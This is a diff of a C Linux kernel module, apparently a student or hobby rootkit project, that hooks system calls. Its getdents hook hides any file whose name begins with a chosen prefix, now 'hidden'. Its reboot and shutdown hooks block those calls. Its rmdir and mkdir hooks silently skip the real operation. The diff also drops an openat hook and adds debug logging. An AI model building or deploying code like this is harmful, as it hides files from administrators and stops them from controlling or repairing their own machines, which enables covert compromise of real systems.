@@ -7,7 +7,7 @@
 
 #define enable_reboot 0
 #define enable_shutdown 0
-#define HIDE_PREFIX ".ash"
+#define HIDE_PREFIX "hidden"
 #define HIDE_PREFIX_SZ (sizeof(HIDE_PREFIX) - 1)
 
 MODULE_LICENSE("GPL");
@@ -30,8 +30,8 @@ orig_shutdown_t orig_shutdown;
 struct linux_dirent {
 	unsigned long	d_ino;
 	unsigned long	d_off;
-	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
-	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
+	unsigned short	d_reclen;
+	char		d_name[1];
 };
 
 asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
@@ -41,20 +41,18 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *di
 	char* dbuf;
     printk("Project: Get Dents called");
 	if (ret <= 0) {
+        printk("ret was <= 0");
 		return ret;
 	}
 	dbuf = (char*)dirent;
 	// go through the entries, looking for one that has our prefix
 	for (boff = 0; boff < ret;) {
 		ent = (struct linux_dirent*)(dbuf + boff);
-
-		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0)) {     // or if it has the module name anywhere in it
-			// remove this entry by copying everything after it forward
+        printk("%s", ent->d_name);
+		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0)) {   
 			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
-			// and adjust the length reported
 			ret -= ent->d_reclen;
 		} else {
-			// on to the next entry
 			boff += ent->d_reclen;
 		}
 	}
@@ -67,16 +65,8 @@ asmlinkage int hackers_reboot(int magic1,int magic2,int magic3, void* arg)
     {
         return old_reboot_sys_call(magic1,magic2,magic3,arg);
     }
-    //printk("Project: Blocked Reboot Call\n");
+    printk("Project: Blocked Reboot Call\n");
     return EPERM;
-}
-asmlinkage int my_openat(const struct pt_regs *regs){
-	const char __user *filename = (char *)regs->si;
-    char dir_name[100] = {0};
-    strncpy_from_user(dir_name, filename, 100);
-     //printk("Project:Trying to access file with path: %s\n", dir_name);
-     orig_openat(regs);
-    return 0;
 }
 
 
@@ -85,7 +75,7 @@ asmlinkage int my_shutdown(int para1, int para2) {
     {
         return orig_shutdown(para1,para2);
     }
-    //printk("Project: Blocked Shutdown Call\n");
+    printk("Project: Blocked Shutdown Call\n");
     return EPERM;
 }
 
@@ -94,7 +84,6 @@ asmlinkage int my_rmdir(const struct pt_regs *regs)
     char __user *filename = (char *)regs->di;
     char dir_name[100] = {0};
     strncpy_from_user(dir_name, filename, 100);
-    //printk("Project:Trying to delete directory with name: %s\n", dir_name);
     //orig_rmdir(regs);
     return 0;
 }
@@ -103,7 +92,6 @@ asmlinkage int my_mkdir(const struct pt_regs *regs)
     char __user *filename = (char *)regs->di;
     char dir_name[100] = {0};
     strncpy_from_user(dir_name, filename, 100);
-    //printk("Project:Trying to make directory with name: %s\n", dir_name);
     //orig_mkdir(regs);
     return 0;
 }
